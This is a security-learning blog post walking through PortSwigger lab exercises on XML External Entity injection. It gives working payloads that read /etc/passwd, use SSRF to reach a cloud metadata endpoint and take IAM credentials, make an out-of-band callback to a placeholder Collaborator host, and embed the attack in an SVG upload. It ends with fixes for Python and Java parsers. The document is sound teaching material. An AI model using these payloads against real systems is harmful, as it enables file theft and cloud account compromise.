XXE Injection — Breaking XML the Fun Way

Today I went deep on XML External Entity injection through PortSwigger's Web Security Academy. Here's everything I learned, broken down simply — what it is, why it works, and how I exploited it in the labs.

Frank · June 2025 · 8 min read · PortSwigger Web Security Academy
TL;DR
  • XXE lets you inject custom XML entities to make the server read files or make internal requests
  • It works because the XML parser processes external entities without checking if it should
  • File read: use <!ENTITY xxe SYSTEM "file:///etc/passwd">
  • SSRF: point the entity at an internal URL instead of a file
  • Fix: disable external entity processing in your XML parser — full stop

What is XXE, actually?

XXE stands for XML External Entity injection. Before we get into the attack itself, you need to understand one thing: XML has a feature called entities. Think of them like variables inside your XML document.

A normal internal entity looks like this: 

XML<!DOCTYPE foo [
  <!ENTITY name "Frank">
]>
<root>Hello &name;</root>

<!-- Parser renders this as: Hello Frank -->

Completely harmless. But XML also supports external entities — ones that load content from somewhere else. That "somewhere else" is where things get dangerous. 

XML<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- If the server is vulnerable, it returns the contents of /etc/passwd -->

If the server parses that without restrictions, it fetches /etc/passwd and puts it in the response. That is XXE. The server is doing exactly what XML was designed to do — the problem is nobody stopped it.

How the attack actually flows

Find an XML input
Look for anywhere the app accepts XML — file uploads, API request bodies, SOAP endpoints, or hidden content-type switches
Inject your DOCTYPE declaration
Add a block that defines an external entity pointing to a file or URL
Reference the entity in the body
Use &xxe; somewhere in the XML that gets reflected back in the response
Server parses and returns the data
If the parser has no restrictions, the file contents or SSRF response lands in your output

Lab 1 — Reading /etc/passwd

This one is the classic. The app has a product stock check feature that sends an XML request body. I intercepted it in Burp and it looked like this: 

XML — original request<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>

I added my DOCTYPE block above the root element and referenced &xxe; inside <productId> because that field was reflected in the response. 

XML — injected payload<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>

The server responded with the full contents of /etc/passwd inside the error message. Done. The key insight here is finding which field gets reflected — that is where you put the entity reference.

What I learned
Always check what field the server reflects back in its response. That is your injection point. If nothing is reflected, you are dealing with blind XXE — completely different approach.

Lab 2 — XXE to SSRF

Same setup, different goal. Instead of pointing the entity at a local file, I pointed it at an internal URL. The lab simulates an AWS-style metadata endpoint that should not be accessible from outside. 

XML — SSRF payload<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

The server fetched that internal URL and returned the directory listing in the response. From there I kept drilling deeper — appending iam/security-credentials/admin to eventually get the IAM credentials for the EC2 instance.

Why this is scary
In a real AWS environment, that metadata endpoint at 169.254.169.254 holds temporary IAM credentials. If you can SSRF to it, you can potentially pivot to the entire cloud account. This is how some of the biggest cloud breaches have started.

Lab 3 — Blind XXE with out-of-band interaction

This one is more realistic. No data comes back in the response — the server processes your XML silently. To confirm it is vulnerable you make the server reach out to a server you control and check your logs for a hit.

I used Burp Collaborator for this. The idea is simple — instead of a file path, point your entity at your Collaborator URL: 

XML — blind XXE payload<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>

If the server is vulnerable, Burp Collaborator picks up a DNS lookup and HTTP request from the server's IP — confirming blind XXE without needing any data in the response.

Where XXE hides in real apps

Places to check
Most people only check obvious XML inputs. But XXE can hide anywhere:
  • File uploads — DOCX, XLSX, SVG, and PDF files are all XML under the hood
  • APIs that accept Content-Type: application/xml
  • SOAP web services — XML everywhere
  • JSON APIs — try switching the Content-Type to XML and see if the server accepts it
  • RSS/Atom feed parsers

The SVG file upload trick

This one surprised me. SVG files are XML. If an app lets you upload an SVG and renders it server-side, you can embed an XXE payload directly inside it: 

SVG — XXE payload<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

Upload that as an image, open it in a browser, and if the server processes it unsafely the file contents appear as text in the rendered SVG. This is a real attack vector used in bug bounty — profile picture uploads are a great place to test.

How to actually fix this

The fix is straightforward. You just need to disable external entity processing in your XML parser. Here is how you do it in the most common languages: 

Pythonfrom lxml import etree

# Safe parser — external entities disabled
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True
)
tree = etree.parse(xml_input, parser)
JavaDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Do not just blocklist keywords
Filtering for "DOCTYPE" or "ENTITY" in the input is not a real fix. Attackers can encode the payload or use alternative approaches to bypass string matching. The only real fix is disabling entity processing at the parser level.

XXE is powerful because the parser does exactly what XML was designed to do. There is no bug in the XML spec — the bug is developers not knowing these features exist and leaving them enabled. Once you understand entities, the attack clicks immediately.
